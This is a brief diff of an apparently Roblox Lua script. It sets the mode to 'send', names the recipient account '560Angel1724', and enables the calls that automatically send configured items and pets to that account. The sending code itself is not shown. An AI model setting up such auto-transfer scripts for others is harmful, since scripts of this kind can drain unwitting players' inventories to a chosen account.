@@ -1,5 +1,5 @@
-PAUSE_or_SEND = "p"
-NAME_USER_SEND = ""
+PAUSE_or_SEND = "s"
+NAME_USER_SEND = "560Angel1724"
 
 _duong_ = false --false/true
 
@@ -381,11 +381,11 @@ end
 --item
 	task.wait(2)
 task.spawn(function()
-	--sendConfiguredItems()
+	sendConfiguredItems()
 end)
 	task.wait(2)
 --pet
 task.spawn(function()
 	task.wait(20)
-	--sendConfiguredPets()
+	sendConfiguredPets()
 end)
